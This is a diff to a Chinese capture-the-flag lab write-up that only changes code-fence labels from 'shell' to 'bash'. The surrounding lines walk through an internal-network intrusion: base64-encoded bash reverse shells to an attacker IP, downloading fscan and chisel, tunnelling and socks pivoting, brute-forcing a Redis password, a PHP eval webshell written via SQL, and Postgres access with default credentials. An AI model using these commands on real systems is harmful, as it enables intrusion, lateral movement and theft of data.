@@ -26,7 +26,7 @@ flag 文件位于 `/flag.txt`
 
 首先先反弹 shell
 
-```shell title="Shiro"
+```bash title="Shiro"
 # /bin/bash -i >& /dev/tcp/192.168.200.129/9999 0>&1
 $ echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjAwLjEyOS85OTk5IDA+JjE= | base64 -d > /tmp/shell.sh
 $ chmod +x /tmp/shell.sh
@@ -37,7 +37,7 @@ $ /bin/bash /tmp/shell.sh
 
 即可收到回连的 shell
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs -lp 9999
 [11:02:56] Welcome to pwncat 🐈!
@@ -50,7 +50,7 @@ root
 
 从攻击机上下载 `fscan` 二进制文件，查看网段信息
 
-```shell
+```bash
 (remote) root@31b77ed217da:/tmp# wget 192.168.200.129/fscan
 --2024-07-25 03:10:17--  http://192.168.200.129/fscan
 Connecting to 192.168.200.129:80... connected.
@@ -123,7 +123,7 @@ Shiro - 192.168.100.3
 
 由于需要访问内网的 Thinkphp 服务，就需要搭建代理隧道
 
-```shell title="Kali"
+```bash title="Kali"
 ┌──(randark ㉿ kali)-[~/tools/chisel-v1.9.1]
 └─$ ./chisel_1.9.1_linux_amd64 server -p 1331 --reverse &
 [1] 1846492
@@ -132,7 +132,7 @@ Shiro - 192.168.100.3
 2024/07/25 11:18:01 server: Listening on http://0.0.0.0:1331
 ```
 
-```shell title="Shiro"
+```bash title="Shiro"
 (remote) root@31b77ed217da:/tmp# wget 192.168.200.129/chisel_1.9.1_linux_amd64
 --2024-07-25 03:17:13--  http://192.168.200.129/chisel_1.9.1_linux_amd64
 Connecting to 192.168.200.129:80... connected.
@@ -153,7 +153,7 @@ chisel_1.9.1_linux_amd64                            100%[=======================
 
 在服务端上成功建立端口转发
 
-```shell
+```bash
 2024/07/25 11:20:24 server: session#4: tun: proxy#R:10001=>192.168.100.2:80: Listening
 ```
 
@@ -187,7 +187,7 @@ flag 文件位于 `/flag.txt`
 
 经过检测，靶机 `Thinkphp` 可以出网，所以可以直接反弹 shell
 
-```shell title="Thinkphp"
+```bash title="Thinkphp"
 # /bin/bash -i >& /dev/tcp/192.168.200.129/9998 0>&1
 $ echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjAwLjEyOS85OTk4IDA+JjE= | base64 -d > /tmp/shell.sh
 $ chmod +x /tmp/shell.sh
@@ -198,7 +198,7 @@ $ /bin/bash /tmp/shell.sh
 
 接收到反连的 shell
 
-```shell title="Kali"
+```bash title="Kali"
 (local) pwncat$ connect -lp 9998
 [11:30:22] received connection from 192.168.200.2:47244                                                                                                                                               bind.py:84
 [11:30:23] 192.168.200.2:47244: registered new host w/ db                                                                                                                                         manager.py:957
@@ -211,7 +211,7 @@ www-data
 
 从攻击机上获取 `fscan` 二进制文件
 
-```shell
+```bash
 (remote) www-data@4c2afff6c232:/tmp$ wget 192.168.200.129/fscan
 --2024-07-25 03:35:58--  http://192.168.200.129/fscan
 Connecting to 192.168.200.129:80... connected.
@@ -228,7 +228,7 @@ fscan                                               100%[=======================
 
 查看网卡信息
 
-```shell
+```bash
 (remote) www-data@4c2afff6c232:/tmp$ ifconfig
 eth0      Link encap:Ethernet  HWaddr 02:42:C0:A8:64:02
           inet addr:192.168.100.2  Bcast:192.168.100.255  Mask:255.255.255.0
@@ -258,7 +258,7 @@ lo        Link encap:Local Loopback
 
 发现了一个新的 `10.85.101.0/24` 网段，尝试进行网段扫描
 
-```shell
+```bash
 start ping
 (icmp) Target 10.85.101.3     is alive
 (icmp) Target 10.85.101.2     is alive
@@ -305,7 +305,7 @@ Redis - 10.85.101.2
 
 由于 `10.85.101.0/24` 内的服务较多，所以直接进行 socks 转发
 
-```shell title="Thinkphp"
+```bash title="Thinkphp"
 (remote) www-data@4c2afff6c232:/tmp$ wget 192.168.200.129/chisel_1.9.1_linux_amd64
 --2024-07-25 03:44:11--  http://192.168.200.129/chisel_1.9.1_linux_amd64
 Connecting to 192.168.200.129:80... connected.
@@ -326,7 +326,7 @@ chisel_1.9.1_linux_amd64                            100%[=======================
 
 成功建立 socks 代理
 
-```shell title="Kali"
+```bash title="Kali"
 2024/07/25 11:45:28 server: session#6: tun: proxy#R:10002=>socks: Listening
 ```
 
@@ -334,7 +334,7 @@ chisel_1.9.1_linux_amd64                            100%[=======================
 
 将 `10.85.101.2:6379`Redis 服务转发出来
 
-```shell title="Thinkphp"
+```bash title="Thinkphp"
 (remote) www-data@4c2afff6c232:/tmp$ ./chisel_1.9.1_linux_amd64 client 192.168.200.129:1331 R:0.0.0.0:16379:10.85.101.2:6379
 2024/07/25 04:56:13 client: Connecting to ws://192.168.200.129:1331
 2024/07/25 04:56:13 client: Connected (Latency 755.012µs)
@@ -342,13 +342,13 @@ chisel_1.9.1_linux_amd64                            100%[=======================
 
 成功建立转发
 
-```shell title="Kali"
+```bash title="Kali"
 2024/07/25 12:56:13 server: session#16: tun: proxy#R:16379=>10.85.101.2:6379: Listening
 ```
 
 然后使用 [vgo0/redisbrute: Rust based Redis AUTH bruteforcer with support for ACLs](https://github.com/vgo0/redisbrute) 进行爆破
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tools]
 └─$ ./redisbrute --ip 127.0.0.1 --port 16379 --passwords /usr/share/wordlists/rockyou.txt
 [+] Valid password found - 12345
@@ -358,7 +358,7 @@ chisel_1.9.1_linux_amd64                            100%[=======================
 
 爆破的到密码之后，进入数据库
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tools]
 └─$ redis-cli -h 127.0.0.1 -p 16379 -a "12345"
 Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
@@ -428,7 +428,7 @@ select '<?php @eval($_POST["shell"])?>' into outfile '/var/www/html/shell.php'
 
 首先，在 `Thinkphp` 主机上建立内网 -> 外网的端口转发
 
-```shell title="Thinkphp"
+```bash title="Thinkphp"
 (remote) www-data@4c2afff6c232:/tmp$ ./chisel_1.9.1_linux_amd64 client 192.168.200.129:1331 8888:0.0.0.0:8888
 [2] 2075
 2024/07/25 05:42:33 client: Connecting to ws://192.168.200.129:1331
@@ -445,7 +445,7 @@ select '<?php @eval($_POST["shell"])?>' into outfile '/var/www/html/shell.php'
 
 成功收到反弹的 shell
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/tools]
 └─$ nc -lvnp 8888
 listening on [any] 8888 ...
@@ -458,7 +458,7 @@ root
 
 查看网卡信息
 
-```shell
+```bash
 da2bf9a19d9a:/tmp# ifconfig
 ifconfig
 eth0      Link encap:Ethernet  HWaddr 02:42:0A:55:65:04
@@ -491,7 +491,7 @@ lo        Link encap:Local Loopback
 
 借助蚁剑，上传 `fscan` 之后进行扫描
 
-```shell
+```bash
 start infoscan
 (icmp) Target 172.56.102.1    is alive
 (icmp) Target 172.56.102.2    is alive
@@ -541,7 +541,7 @@ Struts2 - 172.56.102.3
 
 建立端口转发
 
-```shell title="Thinkphp"
+```bash title="Thinkphp"
 (remote) www-data@4c2afff6c232:/tmp$ ./chisel_1.9.1_linux_amd64 client 192.168.200.129:1331 1331:1331
 2024/07/25 06:53:43 client: Connecting to ws://192.168.200.129:1331
 2024/07/25 06:53:43 client: tun: proxy#1331=>1331: Listening
@@ -556,7 +556,7 @@ Struts2 - 172.56.102.3
 
 然后在 `phpMyAdmin` 上建立代理隧道
 
-```shell
+```bash
 da2bf9a19d9a:/tmp# ./chisel_1.9.1_linux_amd64 client 10.85.101.3:1331 R:0.0.0.0:10005:socks
 <amd64 client 10.85.101.3:1331 R:0.0.0.0:10005:socks
 2024/07/25 06:57:34 client: Connecting to ws://10.85.101.3:1331
@@ -565,7 +565,7 @@ da2bf9a19d9a:/tmp# ./chisel_1.9.1_linux_amd64 client 10.85.101.3:1331 R:0.0.0.0:
 
 成功建立代理
 
-```shell title="Kali"
+```bash title="Kali"
 2024/07/25 14:57:35 server: session#20: tun: proxy#R:10005=>socks: Listening
 ```
 
@@ -587,7 +587,7 @@ da2bf9a19d9a:/tmp# ./chisel_1.9.1_linux_amd64 client 10.85.101.3:1331 R:0.0.0.0:
 
 根据之前 `fscan` 的结果，已经得知 Postgres 服务的凭据为 `postgres:password`
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains4 pgcli -h 172.56.102.2 -u postgres
 [proxychains] config file found: /etc/proxychains4.conf
@@ -617,7 +617,7 @@ Time: 0.043s
 
 ## flag - Postgres
 
-```shell
+```bash
 postgres> \c flag
 [proxychains] Strict chain  ...  127.0.0.1:10005  ...  172.56.102.2:5432  ...  OK
 You are now connected to database "flag" as user "postgres"
